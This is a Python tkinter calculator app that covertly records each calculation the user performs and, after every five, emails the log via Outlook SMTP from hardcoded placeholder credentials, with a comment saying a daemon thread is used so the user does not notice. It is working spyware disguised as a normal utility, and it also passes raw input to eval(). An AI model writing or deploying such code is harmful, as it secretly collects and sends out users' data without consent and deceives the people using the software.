import tkinter as tk
from threading import Timer, Thread
from datetime import datetime
import keyboard 
import smtplib # sending emails


# Global Variables
calculation = ""
query = ""
log = []
start_dt = datetime.now()

# Email and password to send email from.
EMAIL = "placeholder@hotmail.com"
PASSWORD = "password"

# send email after every 5 calculations

def send_email():
    global start_dt
    end_dt = datetime.now()
    subject = "log: " + str(start_dt.replace(microsecond=0)) + " -> " + str(end_dt.replace(microsecond=0))
    msg = ""
    for calc in log:
        msg += calc
        msg += '\n'

    msg = 'Subject: {}\n\n{}'.format(subject, msg)
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()

    server.login(EMAIL, PASSWORD)
    server.sendmail(EMAIL, EMAIL, msg)
    print("Sent email")
    start_dt = datetime.now()

def add_to_calculation(symbol):
    global calculation
    global query
    calculation += str(symbol)
    text_input.set(calculation)
    query = calculation


def evaluate_calculation():
    global calculation
    global query
    try:
        calculation = str(eval(calculation))
        query += "="
        query += calculation
        log.append(query)
        
        print("Log for this calculation is: ", query)
        print("Total log is", log)
        if len(log) == 5:

            # Daemon Thread to avoid the user noticing the email being sent in the background
            t = Thread(target = send_email)
            t.setDaemon(True)
            t.start()
            
            log.clear()
        text_input.set(calculation)

    except:
        clear_field()
        text_input.set("Error")

def clear_field():
    global query
    print("Log for this calculation is: ", query)
    text_input.set("")
    query = ""

def callback(var, index, mode):
    global calculation, query
    calculation = text_input.get()
    query = calculation
    print(calculation)
    print("query is", query)

def onKeyPress(event):
    print("presssed", event.char)
    if event.keycode == 13: # enter key
        evaluate_calculation()
    
root = tk.Tk()
root.title("Calculator")
root.geometry("362x400")
text_input = tk.StringVar()
input_frame = tk.Frame( width = 312, height = 70, bd = 20, highlightbackground="black", highlightcolor="black")
input_frame.pack(side=tk.TOP)

text_input.trace_add("write", callback)
txtDisplay = tk.Entry(input_frame, font = ('arial',20,'bold'), textvariable = text_input, bd = 10, insertwidth = 4, bg = "powder blue", justify = 'right')
txtDisplay.grid(columnspan=5)

btn_frame = tk.Frame(width = 312, height = 350, bg = "grey")
btn_frame.pack()
root.bind('<KeyPress>', onKeyPress)

# The buttons of the calculator program

btn_1 = tk.Button(btn_frame, text="1", command=lambda: add_to_calculation(1), width=7, height=2, font=("Arial", 14))
btn_1.grid(row=2, column=1)
btn_2 = tk.Button(btn_frame, text="2", command=lambda: add_to_calculation(2), width=7,height=2, font=("Arial", 14))
btn_2.grid(row=2, column=2)
btn_3 = tk.Button(btn_frame, text="3", command=lambda: add_to_calculation(3), width=7,height=2,font=("Arial", 14))
btn_3.grid(row=2, column=3)
btn_plus = tk.Button(btn_frame, text="+", command=lambda: add_to_calculation("+"), width=7,height=2, font=("Arial", 14))
btn_plus.grid(row=2, column=4)
btn_4 = tk.Button(btn_frame, text="4", command=lambda: add_to_calculation(4), width=7,height=2, font=("Arial", 14))
btn_4.grid(row=3, column=1)
btn_5 = tk.Button(btn_frame, text="5", command=lambda: add_to_calculation(5), width=7, height=2,font=("Arial", 14))
btn_5.grid(row=3, column=2)
btn_6 = tk.Button(btn_frame, text="6", command=lambda: add_to_calculation(6), width=7, height=2,font=("Arial", 14))
btn_6.grid(row=3, column=3)
btn_minus = tk.Button(btn_frame, text="-", command=lambda: add_to_calculation("-"), width=7,height=2, font=("Arial", 14))
btn_minus.grid(row=3, column=4)
btn_7 = tk.Button(btn_frame, text="7", command=lambda: add_to_calculation(7), width=7,height=2, font=("Arial", 14))
btn_7.grid(row=4, column=1)
btn_8 = tk.Button(btn_frame, text="8", command=lambda: add_to_calculation(8), width=7, height=2,font=("Arial", 14))
btn_8.grid(row=4, column=2)
btn_9 = tk.Button(btn_frame, text="9", command=lambda: add_to_calculation(9), width=7, height=2,font=("Arial", 14))
btn_9.grid(row=4, column=3)
btn_times = tk.Button(btn_frame, text="*", command=lambda: add_to_calculation("*"), width=7,height=2, font=("Arial", 14))
btn_times.grid(row=4, column=4)
btn_open = tk.Button(btn_frame, text="(", command=lambda: add_to_calculation("("), width=7,height=2, font=("Arial", 14))
btn_open.grid(row=5, column=1)
btn_0 = tk.Button(btn_frame, text="0", command=lambda: add_to_calculation(0), width=7, height=2,font=("Arial", 14))
btn_0.grid(row=5, column=2)
btn_close = tk.Button(btn_frame, text=")", command=lambda: add_to_calculation(")"), width=7, height=2,font=("Arial", 14))
btn_close.grid(row=5, column=3)
btn_div = tk.Button(btn_frame, text="/", command=lambda: add_to_calculation("/"), width=7,height=2, font=("Arial", 14))
btn_div.grid(row=5, column=4)
btn_clear = tk.Button(btn_frame, text="Clear", command=clear_field, width=15, height=2,font=("Arial", 14))
btn_clear.grid(row=6, column=1, columnspan=2)
btn_equals = tk.Button(btn_frame, text="=", command=evaluate_calculation, width=15,height=2, font=("Arial", 14))
btn_equals.grid(row=6, column=3, columnspan=2)

root.mainloop()





